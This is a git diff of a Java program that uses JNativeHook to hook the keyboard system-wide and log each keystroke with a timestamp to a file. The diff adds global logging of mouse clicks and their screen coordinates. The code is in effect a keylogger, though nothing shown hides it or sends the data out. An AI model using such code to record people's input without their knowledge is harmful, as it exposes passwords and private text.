@@ -1,12 +1,16 @@
+import lc.kra.system.mouse.event.GlobalMouseEvent;
+import lc.kra.system.mouse.event.GlobalMouseListener;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
+import org.jnativehook.mouse.NativeMouseEvent;
+import org.jnativehook.mouse.NativeMouseInputListener;
 
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
-public class Main implements NativeKeyListener {
+public class Main implements NativeKeyListener, NativeMouseInputListener {
     private static FileLogger log;
 
     public void nativeKeyPressed(NativeKeyEvent e) {
@@ -32,13 +36,17 @@ public class Main implements NativeKeyListener {
         log.appendToLog(System.currentTimeMillis() + " " + "Key Typed: " + e.getKeyText(e.getKeyCode()));
     }
 
+    public void nativeMousePressed(NativeMouseEvent e) {
+        System.out.println("Mouse Pressed: " + e.getButton() + " at " + e.getX() + ";" + e.getY());
+        log.appendToLog(System.currentTimeMillis() + " " + "Mouse Pressed: " + e.getButton() + " at " + e.getX() + ";" + e.getY());
+    }
+
+
     public static void main(String[] args) {
         log = new FileLogger();
 
         Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.WARNING);
-
-// Don't forget to disable the parent handlers.
         logger.setUseParentHandlers(false);
 
         try {
@@ -50,6 +58,24 @@ public class Main implements NativeKeyListener {
             System.exit(1);
         }
 
-        GlobalScreen.addNativeKeyListener(new Main());
+        Main starter = new Main();
+        GlobalScreen.addNativeKeyListener(starter);
+        GlobalScreen.addNativeMouseListener(starter);
+    }
+
+    //Nicht implementierte Methoden
+    @Override
+    public void nativeMouseMoved(NativeMouseEvent nativeMouseEvent) {
+    }
+
+    @Override
+    public void nativeMouseDragged(NativeMouseEvent nativeMouseEvent) {
+    }
+
+    @Override
+    public void nativeMouseReleased(NativeMouseEvent nativeMouseEvent) {
+    }
+    @Override
+    public void nativeMouseClicked(NativeMouseEvent e) {
     }
 }
